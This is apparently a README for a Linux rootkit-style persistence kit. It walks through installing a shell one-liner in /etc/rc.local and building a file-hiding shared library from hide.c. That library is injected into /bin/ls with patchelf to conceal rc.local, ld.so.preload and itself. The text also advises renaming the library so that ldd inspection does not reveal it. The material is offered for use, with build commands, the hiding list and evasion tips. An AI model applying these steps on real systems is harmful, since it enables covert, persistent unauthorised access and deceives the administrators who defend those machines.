The deployment of this method may vary, but we will go over one example using /etc/rc.local. 
If the service for /etc/rc.local is not configured, you may need to create a systemd start-up script 
or another start-script that will initiate actions at boot time.  If you look at the rc.local in this 
folder you will find the one-liner used to create our shell. You can just copy this to /etc/rc.local
as root.

You may use the Makefile in this directory to build the library for ld.so.preload:

$ make
cc -fPIC -shared -Oz -fno-stack-protector -fno-asynchronous-unwind-tables -fno-ident -ffunction-sections -fdata-sections -falign-functions=1 -falign-loops=1 -s -Wa,--no-pad-sections -march=native -pipe -o libhide.so libhide.c -ldl -nostartfiles -Wl,-z,norelro -Wl,-O1 -Wl,--build-id=none -Wl,-z,separate-code -s

You can then use patchelf to hook calls to ls and hide files:

patchelf --add-needed /lib/x86_64-linux-gnu/libhide.so /bin/ls

I should note, this will be noticable using ldd only on the /bin/ls binary:

# ldd /bin/ls
	linux-vdso.so.1 (0x00007fc87a660000)
	/lib/x86_64-linux-gnu/libhide.so (0x00007fc87a62b000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007fc87a5ec000)
	libcap.so.2 => /lib/x86_64-linux-gnu/libcap.so.2 (0x00007fc87a5e0000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc87a3ea000)
	libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007fc87a33b000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fc87a662000)

So chosing a more uniform and harmless name for this file should be advised. 

Should you need to add or update the filenames that are hidden, you may edit this struct in the hide.c 
and recompile it:

// List of files to hide
static const char *HIDE_NAMES[] = {
    "rc.local",
    "ld.so.preload",
    "libhide.so",
    NULL // Sentinel
};

Now even if the Linux device is rebooted, our in memory shell should survive.
